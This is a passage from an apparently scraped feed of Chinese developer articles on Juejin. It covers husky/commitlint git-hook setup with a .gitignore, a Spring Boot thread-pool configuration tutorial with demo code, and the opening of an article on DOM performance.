<h4 data-id="heading-21">7.2 初始化husky</h4>
<ol>
<li>npx方式</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">npx husky init
</code></pre>
<ol start="2">
<li>pnpm方式</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> husky init
</code></pre>
<h4 data-id="heading-22">7.3 配置husky的pre-commit钩子</h4>
<p>在.husky中创建pre-commit（无后缀）文件
写入</p>
<pre><code class="hljs language-bash" lang="bash">npx lint-staged
</code></pre>
<p>并在package.json中的根object里写入lint-staged配置</p>
<pre><code class="hljs language-json" lang="json"> <span class="hljs-attr">"lint-staged"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"src/**/*.{ts,tsx}"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
            <span class="hljs-string">"eslint --fix"</span>
        <span class="hljs-punctuation">]</span>
    <span class="hljs-punctuation">}</span>
</code></pre>
<p>此时，每当你git commit的时候它都会先执行eslint</p>
<h3 data-id="heading-23">8. husky设置commit message</h3>
<p>为了规范每次提交记录的message，我们使用commitlint规范：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">feat:</span> add <span class="hljs-built_in">new</span> feature
<span class="hljs-symbol">fix:</span> bug fix
<span class="hljs-symbol">docs:</span> documentation changes
<span class="hljs-symbol">style:</span> formatting changes
<span class="hljs-symbol">refactor:</span> code refactoring
<span class="hljs-symbol">test:</span> adding tests
<span class="hljs-symbol">chore:</span> maintenance tasks
</code></pre>
<p>引入commit-lint</p>
<pre><code class="hljs language-bash" lang="bash">pnpm add -D @commitlint/cli @commitlint/config-conventional
</code></pre>
<p>创建commitlint.config.js</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-attr">extends</span>: [<span class="hljs-string">'@commitlint/config-conventional'</span>]
}
</code></pre>
<p>在.husky目录中创建commit-msg（无后缀）文件并写入：</p>
<pre><code class="hljs language-bash" lang="bash">pnpm <span class="hljs-built_in">exec</span> commitlint --edit <span class="hljs-variable">$1</span>
</code></pre>
<p>此后后续的commit提交的message都会匹配是否以上述规范中的lint的title相匹配，比如我提交一个需求必须以：<code>feat: </code>开头</p>
<h3 data-id="heading-24">9. 创建.gitignore</h3>
<p>屏蔽掉常见的本地配置/依赖项</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Dependencies</span>
node_modules
.pnpm-store

<span class="hljs-comment"># Build output</span>
dist

<span class="hljs-comment"># IDE</span>
.idea
.vscode
*.swp
*.swo

<span class="hljs-comment"># OS</span>
.DS_Store
Thumbs.db

<span class="hljs-comment"># Logs</span>
*.<span class="hljs-built_in">log</span>
npm-debug.log*

<span class="hljs-comment"># Environment</span>
.<span class="hljs-built_in">env</span>
.env.local
.<span class="hljs-built_in">env</span>.*.<span class="hljs-built_in">local</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[springboot框架 线程池使用与配置，简单粗暴直接用，再也不用自己创建线程了~]]></title>    <link>https://juejin.cn/post/7584266184881504290</link>    <guid>https://juejin.cn/post/7584266184881504290</guid>    <pubDate>2025-12-16T08:16:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584266184881504290" data-draft-id="7584071941024579599" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="springboot框架 线程池使用与配置，简单粗暴直接用，再也不用自己创建线程了~"/> <meta itemprop="keywords" content="Java,Spring Boot,后端"/> <meta itemprop="datePublished" content="2025-12-16T08:16:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Json_"/> <meta itemprop="url" content="https://juejin.cn/user/1511154281613834"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            springboot框架 线程池使用与配置，简单粗暴直接用，再也不用自己创建线程了~
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1511154281613834/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Json_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:16:59.000Z" title="Tue Dec 16 2025 08:16:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>直接上代码：</p>
<p><strong>第一步：配置</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.testweb.testweb.threadWeb;

<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.aop.interceptor.AsyncUncaughtExceptionHandler;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.scheduling.annotation.AsyncConfigurer;
<span class="hljs-keyword">import</span> org.springframework.scheduling.annotation.EnableAsync;
<span class="hljs-keyword">import</span> org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;

<span class="hljs-keyword">import</span> java.util.concurrent.ThreadPoolExecutor;

<span class="hljs-comment">/**
 * User:Json
 * Date: 2025/12/6
 **/</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableAsync</span>  <span class="hljs-comment">//没有这个注解 线程不会生效</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AsyncConfigurer</span> {
    <span class="hljs-comment">//4 核 CPU / 小型服务器配置  按服务器配置 调整</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">corePoolSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">4</span>;   <span class="hljs-comment">// 核心线程数（默认线程数）创建后会在内存里常驻</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">maxPoolSize</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;    <span class="hljs-comment">// 最大线程数（包含核心线程），当核心线程和队列满时，最多会创建 4 个非核心线程</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">keepAliveTime</span> <span class="hljs-operator">=</span> <span class="hljs-number">60</span>;   <span class="hljs-comment">// 非核心线程空闲回收时间（单位：秒）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">queueCapacity</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>; <span class="hljs-comment">// 缓冲队列数</span>

    <span class="hljs-comment">/**
     * 默认异步线程池 ThreadPoolTaskExecutor 常用
     */</span>
    <span class="hljs-meta">@Bean("taskExecutor")</span>
    <span class="hljs-keyword">public</span> ThreadPoolTaskExecutor <span class="hljs-title function_">taskExecutor</span><span class="hljs-params">()</span>{
        <span class="hljs-type">ThreadPoolTaskExecutor</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolTaskExecutor</span>();
        pool.setThreadNamePrefix(<span class="hljs-string">"DY-Async-Task-"</span>); <span class="hljs-comment">//线程前缀  便于日志查看</span>
        pool.setCorePoolSize(corePoolSize);
        pool.setMaxPoolSize(maxPoolSize);
        pool.setKeepAliveSeconds(keepAliveTime);
        pool.setQueueCapacity(queueCapacity);
       <span class="hljs-comment">// pool.setAllowCoreThreadTimeOut(true);//  默认核心线程常驻 如果希望在低配服务器核心线程空闲也释放资源，可加上这行</span>

        <span class="hljs-comment">// 直接在execute方法的调用线程中运行</span>
        pool.setRejectedExecutionHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy());
        <span class="hljs-comment">// 初始化</span>
        pool.initialize();
        <span class="hljs-keyword">return</span> pool;
    }

    <span class="hljs-comment">/**
     * 异步任务异常处理 如果调用的地方 try catch了 这边就不会走了
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> AsyncUncaughtExceptionHandler <span class="hljs-title function_">getAsyncUncaughtExceptionHandler</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> (ex, method, params) -&gt; {
            log.info(<span class="hljs-string">"异步任务出现异常: 方法: {}, 参数: {}"</span>, method.getName(), params, ex);
        };
    }
}

</code></pre>
<p><strong>第二步： 写demo</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.testweb.testweb.threadWeb;

<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.scheduling.annotation.Async;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.concurrent.CompletableFuture;

<span class="hljs-comment">/**
 * User:Json
 * Date: 2025/12/6
 **/</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadService</span> {

    <span class="hljs-comment">//无返回值</span>
    <span class="hljs-meta">@Async("taskExecutor")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">//异常 测试</span>
        <span class="hljs-comment">// int a=1/0;</span>
        log.info(<span class="hljs-string">"异步线程"</span>);
    }
    <span class="hljs-comment">//有返回值</span>
    <span class="hljs-meta">@Async("taskExecutor")</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;Integer&gt; <span class="hljs-title function_">asyncCompute</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> {
        log.info(<span class="hljs-string">"异步计算开始，线程: {}"</span>, Thread.currentThread().getName());
        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span> / num;  <span class="hljs-comment">// 如果 num=0，会抛异常</span>
        log.info(<span class="hljs-string">"异步计算结束，结果: {}"</span>, result);
        <span class="hljs-comment">//休息10秒 假装堵塞</span>
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">10</span> * <span class="hljs-number">1000L</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        }
        <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(result);
    }
}

</code></pre>
<p><strong>第三步：控制器测试：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.testweb.testweb.threadWeb;

<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.<span class="hljs-keyword">annotation</span>.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.GetMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RequestParam;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;

<span class="hljs-keyword">import</span> java.util.concurrent.CompletableFuture;

<span class="hljs-comment">/**
 * User:Json
 * Date: 2025/12/6
 **/</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadController</span> {

    <span class="hljs-meta">@Autowired</span>
    ThreadService threadService;

    <span class="hljs-comment">//无返回值测试</span>
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"testThread"</span>)</span>
    <span class="hljs-keyword">public</span> void test() {
        threadService.test();
    }

    <span class="hljs-comment">//有返回值测试</span>
    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/compute"</span>)</span>
    <span class="hljs-keyword">public</span> String testCompute(<span class="hljs-meta">@RequestParam</span> int num) {
        CompletableFuture&lt;Integer&gt; future = threadService.asyncCompute(num);

        <span class="hljs-comment">//1. 阻塞情况</span>
<span class="hljs-comment">//        try {</span>
<span class="hljs-comment">//            Integer result = future.get(); // 会阻塞，等待返回值</span>
<span class="hljs-comment">//            log.info("阻塞 计算结果: " + result);</span>
<span class="hljs-comment">//        } catch (Exception e) {</span>
<span class="hljs-comment">//            log.info("异步计算异常: {}", e.getMessage(), e);</span>
<span class="hljs-comment">//        }</span>

        <span class="hljs-comment">// 2. 不阻塞情况 ，注册回调处理结果</span>
        future.thenAccept(result -&gt; {
            log.info(<span class="hljs-string">"异步计算完成，不阻塞结果: {}"</span>, result);
        }).exceptionally(ex -&gt; {
            log.info(<span class="hljs-string">"异步计算异常"</span>, ex);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        });

        <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>;
    }

}

</code></pre>
<p><strong>jvm调试测试结果：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8837b8612564a20ae4c3acbf0f1cd56~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnNvbl8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766477818&amp;x-signature=lvZDKRHlOCen51kGLjJiazaltQg%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4df8f160c4f04628b79079538db8b728~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnNvbl8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766477818&amp;x-signature=BNlGoZf9TGC4SDeopK%2F8Flpso4M%3D" alt="image.png" loading="lazy"/></p>
<p><strong>在异步方法里写业务逻辑的注意项：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb38a0c3b8e1400ba6666bb20642a6ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSnNvbl8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766477818&amp;x-signature=nSOGTuxuDW6qU6G3oErvAZm7SWk%3D" alt="image.png" loading="lazy"/></p>
<p>如需补充，欢迎大家留言~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[浏览器相关 API：DOM 操作全解析]]></title>    <link>https://juejin.cn/post/7584061465398951977</link>    <guid>https://juejin.cn/post/7584061465398951977</guid>    <pubDate>2025-12-16T08:34:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584061465398951977" data-draft-id="7584061465398919209" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="浏览器相关 API：DOM 操作全解析"/> <meta itemprop="keywords" content="前端,DOM,浏览器"/> <meta itemprop="datePublished" content="2025-12-16T08:34:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024肥宅"/> <meta itemprop="url" content="https://juejin.cn/user/588993964030574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            浏览器相关 API：DOM 操作全解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/588993964030574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024肥宅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:34:53.000Z" title="Tue Dec 16 2025 08:34:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">引言</h4>
<p>DOM（文档对象模型）是Web开发的核心，它代表了HTML和XML文档的结构化表示。高效的DOM操作对于构建高性能Web应用至关重要。本文将全面解析DOM操作相关的API、性能优化策略和现代最佳实践。</p>
<h4 data-id="heading-1">一、DOM基础与性能考量</h4>
<h5 data-id="heading-2">1.1 DOM操作的成本分析</h5>
<p>DOM操作是浏览器中成本最高的操作之一，理解其性能影响是优化的第一步。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DOMPerformanceAnalyzer</span> {
  <span class="hljs-comment">// 重排（Reflow）测试</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">testReflow</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> container = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>);
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(container);
    
    <span class="hljs-comment">// 连续修改样式导致多次重排</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">'多次重排'</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
      container.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = i + <span class="hljs-string">'px'</span>;
      container.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = i + <span class="hljs-string">'px'</span>;
      container.<span class="hljs-property">style</span>.<span class="hljs-property">padding</span> = i + <span class="hljs-string">'px'</span>;
    }
